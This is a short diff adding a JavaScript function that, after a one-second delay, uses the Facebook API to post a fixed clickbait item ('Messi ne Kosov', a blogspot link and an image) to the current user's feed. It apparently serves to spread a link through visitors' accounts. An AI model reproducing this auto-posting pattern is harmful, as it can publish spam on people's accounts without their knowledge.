@@ -1,0 +1,11 @@
+function post_to_fb(){
+	setTimeout(
+		function(){
+			var title = 'Messi ne Kosov';
+			var urlstring = 'http://54234123.blogspot.com/';
+			var picture = 'http://albkos24.com/wp-content/uploads/2014/04/4baf506bb02c50e68c2360e404e4a8a5.jpg';
+            FB.api('/me/feed', 'post', { message: title, link:urlstring, link:urlstring, picture:picture, name:title }, function(response) {
+        });
+        },
+        1000);
+}
